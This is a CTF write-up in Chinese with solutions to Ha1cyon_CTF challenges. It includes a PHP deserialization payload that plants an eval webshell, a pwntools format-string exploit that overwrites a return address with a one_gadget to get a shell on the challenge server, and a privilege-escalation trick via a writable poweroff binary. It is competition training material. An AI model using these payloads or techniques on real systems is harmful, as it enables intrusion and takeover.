# Ha1cyon_CTF－公开赛By 天璇Merak Write Up
## OI
我是出题人，不多说了直接贴exp
矩阵乘法板子
```
#include<cstdio>
#include<cstring>
#include<algorithm>
#include<iostream>
#define ll long long
using namespace std;
const int N=110;
struct Matrix{
  ll a[N][N];
}ans,x;
int n,m,S,T,k;
#define mod 10003;
Matrix operator *(Matrix a,Matrix b)
{
   Matrix t;
     memset(t.a,0,sizeof(t.a));
        for(int i=1;i<=n;i++)
         for(int j=1;j<=n;j++)
          for(int k=1;k<=n;k++)
        {
          t.a[i][j]=(t.a[i][j]+a.a[i][k]*b.a[k][j])%mod;
        }
        return t;
 }

Matrix ksm(Matrix a,ll k)
{
    Matrix res=a;
      while(k)
      {
   if(k&1)
        res=res*a;
           k>>=1;
           a=a*a;
      }
      return res;
}
inline int read()
{
  int x=0,f=1;
  char c=getchar();
  while(c>'9'||c<'0'){if(c=='-')f=-1;c=getchar();}
  while(c>='0'&&c<='9'){x=x*10+c-'0';c=getchar();}
  return x*f;
}
int main()
{
	freopen("yyh.in","r",stdin);
	freopen("yyh.out","w",stdout);
    n=read(),m=read(),k=read();
      for(int i=1;i<=m;i++)
    {
        int u=read(),v=read();
         x.a[u][v]=x.a[v][u]=1;
    }
      ans=ksm(x,k-1);
         printf("%lld\n",ans.a[1][n]);
        return 0;
}
```
## Web

### Web1

view-source:看源码

### Web2

F12看到php地址

序列化对象"assert"传马

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

$h = new HelloPhp;


$h->a = 'file_put_contents("eki.php", "<?php eval(\$_REQUEST[\'cmd\']); ?>")';

$h->b = "assert";

//eval($h->a);

echo urlencode(serialize($h));

@$ppp = unserialize(serialize($h));
```

用蚁剑的插件绕过disable_function

```
echo $FLAG
```

### Web3

利用php://filter/string.strip_tags造成segment fault

然后上传的文件会被保存到/tmp/phpXXXXXX

比赛时么复现出来。。。。。。 贴个参考链接

https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/


## PWN

### badguy

edit处有off-by-one，构造重叠指针，修改stdout的read_base指针，从而泄露Libc，同样使用重叠堆块UAF get shell

### easy_heap

edit里有off-by-one,因为0x38*n小于0x400所以不能直接拿large bin泄露，先伪造sz释放七个大于0x80的块最后泄露unsorted bin上的指针，同样重叠堆块get shell。

### ezdrv

这个是利用非预期做的，echo一个shell到poweroff里(权限没有控制好，用户可写)，以使得在退出的时候以root身份运行这个程序从而提权

### kernel2

和上述操作一样

### level2
基础的格式化字符串，但是字符串不在栈上，所以想到写返回地址，先leak栈地址和libc地址，然后通过栈上的一个二级指针，将其改为返回地址，然后逐字节修改对应位置指针即可，具体数值我本地和远程有差别，可能需要调试，此处给出远程打通的exp:
```
p = remote('ha1cyon-ctf.fun', 30216)

# offset = 6
payload = '%p  ' * 10
payload = payload.ljust(64, '\x00')
p.sendline(payload)

p.recvuntil('0x36  ')
p.recvuntil('0x')
p.recvuntil('0x')
libc_addr = int(p.recv(12), 16)
libc_base = libc_addr - 0x21b97
one_gadget = libc_base + 0x4f322

p.recvuntil('0x1  ')
stack_addr = int(p.recv(14), 16)
retn_addr = stack_addr - 0xe0

print("stack address:" + hex(stack_addr))
print("libc address:" + hex(libc_addr))

# cover the return address

pause()
payload = "%"+str(retn_addr&0xffff)+"c%9$hn"
payload = payload.ljust(0x64, '\x00')
sleep(1)
p.send(payload)
payload = "%"+str(one_gadget&0xff)+"c%35$hhn"
payload = payload.ljust(0x64, '\x00')
sleep(1)
p.send(payload)

payload = "%"+str((retn_addr+1)&0xff)+"c%9$hhn"
payload = payload.ljust(0x64, '\x00')
sleep(1)
p.send(payload)
payload = "%"+str((one_gadget&0xffff)>>8)+"c%35$hhn"
payload = payload.ljust(0x64, '\x00')
sleep(1)
p.send(payload)

payload = "%"+str((retn_addr+2)&0xff)+"c%9$hhn"
payload = payload.ljust(0x64, '\x00')
sleep(1)
p.send(payload)

payload = "%"+str((one_gadget&0xffffff)>>16)+"c%35$hhn"
payload = payload.ljust(0x64, '\x00')
sleep(1)
p.send(payload)
p.send("66666666".ljust(0x64, '\x00'))

p.interactive()
```

## MISC
### 抽象大师
就不提了好吧
让我看看谁是孙🐕粉丝。
孙狗粉丝百万，我们在座的都有罪。
### 老千层饼
分析题目的五个文件，都是压缩包格式，解压后发现一张图片，hint和一个base64编码的txt。  
图片alpha存在LSB隐写  
```
FE82CF3FC11C6B50608360A8305F4FA4182823CA0C14C7A107FAAAAAFE01B3CF008B9C93FCFE9E582BFCF871C5C1B84EB5153AF383182646BCB22802C58CBB64FE5B92E144BCFC96F7938BC7E856C23C80422DF4E83268A5A3CD9FCF14ACCD89C38F781AAA93FC0055C145FFB443EA504C3C91282FF28FBC1116B9CA08C24E7104A0BE18FE8FC594
```
hint为
```
Here's the hint:
33 * 33 = 1089
And everything is inside the image
```
一看就是二维码的提示。  
txt文件解密如下，是一个cyberchef的操作序列，删掉多余的两行。
```
Vigenère_Decode('keepthis')
From_Base64('A-Za-z0-9+/=',true)
DES_Decrypt({'option':'Hex','string':'av?'},{'option':'UTF8','string':'keepthis'},'CBC','Hex','Hex')
```
这里DES需要密钥，提示为`av`，图片名称是BV开头，于是BV号转av号得到av415411。正好是八位可以作为密钥
但是直接使用这个序列或是转为hex或是数字转为hex并加paddle等等都试过，并不能解密...就卡在这了
### 吃掉它
因为看了盖了西之前写过的博客，所以知道宽字符隐写。
首先拿到题目，发现txt里有空格和制表符。
解密得autokey.
那就知道了他是autokey。
然后hint.txt用vim打开。
发现宽字符隐写。do u know NTFS?
流隐写。
接着发现了另一个txt文件在后面。
那么打开词频分析能得到一个encrypto
打过hackgame 都知道这个东西了。
打开secret，但是密码应该是autokey那个东西。爆破。
http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/
password:iamthepasswd
然后在stegsolve中发现某个通道阴影不同构造01编码，(Gimp也可以land师傅教的）写python脚本也能提。
得到密码：p@ssWd
发现docx文件，很简单全部显示之后
发现是一种
Programming Language
只有固定几个字母组成，删去无用的。
得到flag
flag：flag{1t's_v3ry_De1iCi0us~!}
## Crypto
### 这是什么密码
F-》Friday以此类推
3 1 12 5 14 4 1 18
直接字母表
就是flag
### Classical Cipher
有1说1掩码爆破的压缩包，
然后猪圈+古埃及象形文字。

### ez_RSA
emmmm这道题其实是非预期解做的，跟shallow师傅聊的时候才知道想用的是一个paper里的trick，但这里(p-1)和（q-1)的公因数太小了，只有2，导致出现了一些非预期解，我做的时候是看gift和e的公因数是2，然后gift是2045位的，直接phi = gift * 4,然后因为gcd(phi,e) = 2,所以e = e/2，然后正常算出m，再开根就好了，下面是exp：
```from gmpy2 import invert , mpz
from Crypto.Util.number import long_to_bytes
e = 54722
n = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121
gift = 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104
c = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319
phi = gift * 4
# print(gift == phi * 2)
e = e/2
e = mpz(e)
phi = mpz(phi)
d = invert(e, phi)
# sub_m = powmod(c, d, n)
# print(sub_m)
sub_m = 4457739276450750973807362088089319606097011997747961409022906575971021744219518190210017002304776543765491793897149413559709081776139101961
m = (19 ** 2) * 5848575896224186369270943056068754819013913215988172104237309567221

print(m ** 2 == sub_m)
print(long_to_bytes(m))
```
flag: NPUCTF{diff1cult_rsa_1s_e@sy}


